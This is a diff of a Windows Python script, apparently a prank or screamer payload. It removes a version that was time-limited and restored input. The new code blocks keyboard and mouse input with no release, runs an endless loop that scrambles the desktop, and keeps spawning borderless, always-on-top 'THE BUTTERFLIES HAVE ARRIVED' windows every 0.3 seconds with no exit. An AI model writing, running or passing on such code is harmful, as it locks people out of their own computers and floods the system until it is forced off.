@@ -1,70 +1,140 @@
 import ctypes
-import time
 import random
-import sys
+import threading
+import time
+import tkinter as tk
 
+# Windows API constants
 user32 = ctypes.windll.user32
 gdi32 = ctypes.windll.gdi32
 
-def run_chaos():
-    # Attempt to elevate thread priority and lock system input
-    try:
-        user32.BlockInput(True)
-    except Exception:
-        pass
+# Disable input to prevent closing/clicking
+try:
+  user32.BlockInput(True)
+except Exception:
+  pass
 
-    # Get primary desktop device context
-    hdc = user32.GetDC(0)
-    screen_w = user32.GetSystemMetrics(0)
-    screen_h = user32.GetSystemMetrics(1)
 
-    start_time = time.time()
-    
-    # Chaos loop: screen tearing, GDI bitblt scrambling, and message prompts
-    while time.time() - start_time < 30:
-        # Random GDI screen glitching (scrambling pixels / color inversion)
-        op = random.choice([gdi32.PatBlt, gdi32.BitBlt])
-        
-        rx = random.randint(0, screen_w - 200)
-        ry = random.randint(0, screen_h - 200)
-        rw = random.randint(100, 400)
-        rh = random.randint(50, 200)
-        
-        if op == gdi32.PatBlt:
-            # Flash random brush patterns
-            brush = gdi32.CreateSolidBrush(random.randint(0, 0xFFFFFF))
-            gdi32.SelectObject(hdc, brush)
-            gdi32.PatBlt(hdc, rx, ry, rw, rh, 0x00550009) # PATINVERT
-            gdi32.DeleteObject(brush)
-        else:
-            # Screen offset tearing effect
-            gdi32.BitBlt(hdc, rx + random.randint(-20, 20), ry + random.randint(-20, 20), rw, rh, hdc, rx, ry, 0x00CC0020)
+def screen_glitch():
+  # GDI screen manipulation for chaotic tearing/glitching effect
+  hdc = user32.GetDC(0)
+  w = user32.GetSystemMetrics(0)
+  h = user32.GetSystemMetrics(1)
 
-        # Periodically spawn modal warning boxes
-        if random.random() < 0.15:
-            # Non-blocking background thread popup simulation via MessageBoxW (or just quick flashes)
-            pass
+  while True:
+    x = random.randint(0, w - 200)
+    y = random.randint(0, h - 200)
+    # BitBlt copy screen pixels around randomly to create melting/tearing glitches
+    gdi32.BitBlt(
+        hdc,
+        x + random.randint(-20, 20),
+        y + random.randint(-20, 20),
+        random.randint(100, 400),
+        random.randint(100, 400),
+        hdc,
+        x,
+        y,
+        0x00CC0020,  # SRCCOPY
+    )
+    time.sleep(0.005)
 
-        time.sleep(0.015)
 
-    # Release desktop DC and restore input
-    user32.ReleaseDC(0, hdc)
-    try:
-        user32.BlockInput(False)
-    except Exception:
-        pass
+def butterfly_window():
+  root = tk.Tk()
+  root.overrideredirect(True)
+  root.attributes("-topmost", True)
+  root.attributes("-alpha", 0.85)
 
-if __name__ == '__main__':
-    # Spawn multiple alert dialogs using pure Win32 API to display the text
-    import threading
-    
-    def popup_thread():
-        for _ in range(8):
-            user32.MessageBoxW(0, "the butterflies have arrived", "SYSTEM ERROR", 0x10 | 0x40000)
-            time.sleep(0.5)
+  w = root.winfo_screenwidth()
+  h = root.winfo_screenheight()
+  win_w = 450
+  win_h = 250
+  x = random.randint(0, w - win_w)
+  y = random.randint(0, h - win_h)
+  root.geometry(f"{win_w}x{win_h}+{x}+{y}")
+  root.configure(bg="#0a0a0a")
 
-    t = threading.Thread(target=popup_thread)
+  # Warning text
+  label = tk.Label(
+      root,
+      text="THE BUTTERFLIES HAVE ARRIVED",
+      fg="#ff0033",
+      bg="#0a0a0a",
+      font=("Courier", 14, "bold"),
+  )
+  label.pack(pady=20)
+
+  # Canvas for flying black butterfly animation
+  canvas = tk.Canvas(
+      root, width=win_w, height=140, bg="#0a0a0a", highlightthickness=0
+  )
+  canvas.pack()
+
+  # Initial coordinates for butterfly body and wings
+  bx, by = win_w / 2, 70
+  body = canvas.create_oval(
+      bx - 4, by - 25, bx + 4, by + 25, fill="#111111", outline="#ff0033"
+  )
+  left_wing = canvas.create_polygon(
+      bx, by, bx - 60, by - 40, bx - 30, by + 40, fill="black", outline="#333333"
+  )
+  right_wing = canvas.create_polygon(
+      bx, by, bx + 60, by - 40, bx + 30, by + 40, fill="black", outline="#333333"
+  )
+
+  angle = random.uniform(0, 3.14)
+
+  def animate_butterfly():
+    nonlocal angle
+    angle += 0.15
+    offset = random.randint(-15, 15)
+    wing_flap = int(30 * abs(ctypes.windll.kernel32.GetTickCount() % 20 - 10) / 10)
+
+    # Move wings dynamically
+    canvas.coords(
+        left_wing,
+        bx,
+        by,
+        bx - 40 - wing_flap,
+        by - 30 + offset,
+        bx - 20,
+        by + 30,
+    )
+    canvas.coords(
+        right_wing,
+        bx,
+        by,
+        bx + 40 + wing_flap,
+        by - 30 + offset,
+        bx + 20,
+        by + 30,
+    )
+    root.after(30, animate_butterfly)
+
+  animate_butterfly()
+  root.mainloop()
+
+
+def spawn_swarm():
+  # Spawn multiple windows continuously
+  while True:
+    t = threading.Thread(target=butterfly_window)
     t.daemon = True
     t.start()
+    time.sleep(0.3)
 
-    run_chaos()
+
+if __name__ == "__main__":
+  # Start GDI glitch thread
+  glitch_thread = threading.Thread(target=screen_glitch)
+  glitch_thread.daemon = True
+  glitch_thread.start()
+
+  # Start window swarm thread
+  swarm_thread = threading.Thread(target=spawn_swarm)
+  swarm_thread.daemon = True
+  swarm_thread.start()
+
+  # Keep main thread alive
+  while True:
+    time.sleep(1)
